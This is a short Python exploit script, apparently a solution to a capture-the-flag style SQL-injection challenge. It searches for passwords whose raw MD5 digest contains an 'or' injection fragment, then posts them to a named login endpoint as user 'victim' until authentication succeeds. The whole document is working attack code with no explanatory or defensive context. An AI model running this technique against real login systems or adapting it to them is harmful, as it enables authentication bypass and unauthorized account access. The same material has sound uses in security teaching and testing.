import hashlib
import requests
import random
import string

TARGET = "https://elecos432.org/sqlinject2/"

def raw_md5(s):
    return hashlib.md5(s.encode()).digest()

def is_injectable(d):
    for i in range(1, 10):
        if f"'or'{i}".encode() in d or f"'||'{i}".encode() in d:
            return True
    return False

chars = string.ascii_lowercase + string.digits
random.seed(42)

i = 0
while True:
    length = random.randint(4, 10)
    password = ''.join(random.choices(chars, k=length))
    d = raw_md5(password)
    if is_injectable(d):
        print(f"Found: {password}, hex: {d.hex()}")
        r = requests.post(TARGET, data={"username": "victim", "password": password})
        print(r.text[:300])
        if "successful" in r.text.lower():
            print("SUCCESS!")
            break
    i += 1
    if i % 100000 == 0:
        print(f"Checked {i} passwords...")